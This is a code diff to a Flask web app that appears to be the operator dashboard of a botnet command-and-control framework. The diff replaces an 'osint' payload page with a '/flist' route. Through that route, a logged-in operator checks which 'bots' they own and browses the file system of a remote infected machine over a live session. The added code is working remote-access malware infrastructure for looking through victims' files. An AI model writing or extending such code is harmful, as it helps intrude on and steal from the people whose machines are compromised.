@@ -46,15 +46,89 @@ def payloads():
  
  
  
-@main.route("/osint")
+@main.route("/flist")
 @login_required
-def osint():
-    
-	payloads = payload_dao.get_user_payloads(current_user.id)
-	return render_template("osint.html", 
-							payloads=payloads, 
-							owner=current_user.username, 
-							title="Payloads")
+def flist():
+	session_uid = request.args.get('session_uid')
+	path = request.args.get('path')
+ 
+	# validate session id is valid integer
+	if not session_uid:
+		flash("Invalid bot UID: {}".format(session_uid))
+		return redirect(url_for('main.sessions'))
+
+	# get current user sessions
+	owner_sessions = c2.sessions.get(current_user.username)
+
+	# check if owner has any active sessions
+	if not owner_sessions:
+		session_dao.update_session_status(session_uid, 0)
+		flash("You have no bots online.", "danger")
+		return redirect(url_for('main.sessions'))
+
+	# check if requested session is owned by current user
+	if session_uid not in owner_sessions:
+		session_dao.update_session_status(session_uid, 0)
+		flash("Invalid bot UID: " + str(session_uid))
+		return redirect(url_for('main.sessions'))
+
+	# get requested session
+	session_thread = owner_sessions.get(session_uid)
+	import urllib
+	to_quote = lambda s: urllib.parse.quote_plus(s.encode('UTF-8'))
+	to_path = lambda name: to_quote(path + '\\' + name if len(path) > 0 else name)
+	# if session is online, authenticate user and enter shell
+	if session_thread:
+		if session_thread.info['owner'] == current_user.username:
+			files = session_thread.list_dir_file(path)
+			file2 = []
+			folder = []
+   
+			print("DEBUG RETURN PATH ========> ",path)
+			if(path != ""):
+				listpath = path.split("\\")
+				nearpath = to_quote('\\'.join(listpath[: -1]))
+				return_near_path = ("folder", "..", nearpath)
+				folder.append(return_near_path)
+			if(files is not None):
+		
+				for index, item in enumerate(files):
+					itemlist = list(item)
+					if(itemlist[0] is None):
+						itemlist[0] = "folder"
+						if("{{{$" in itemlist[1]): 
+							continue
+					# print("kiet check ==> itemlist[1] ",itemlist[1],to_path(itemlist[1]))
+						itemlist.append(to_path(itemlist[1]))
+			
+						item = tuple(itemlist)
+						
+						folder.append(item)
+						# print("check folder  => ", item)
+					else:
+						itemlist.append(to_path(itemlist[1]))
+						item = tuple(itemlist)
+						file2.append(item)
+
+				folder += file2
+
+				print("DEBUG FLIST ====> ", folder)
+
+
+			return render_template("filelist.html", 
+									session_uid=session_uid, 
+									files=folder, 
+									path = path,
+									title="Files")
+		else:
+			flash("Bot not owned by current user.", "danger")
+			return redirect(url_for('main.sessions'))
+
+	# if bot is offline, update status in database and notify user
+	else:
+		session_dao.update_session_status(session_uid, 0)
+		flash("Bot is offline.", "danger")
+		return redirect(url_for('main.sessions'))
 
 
 
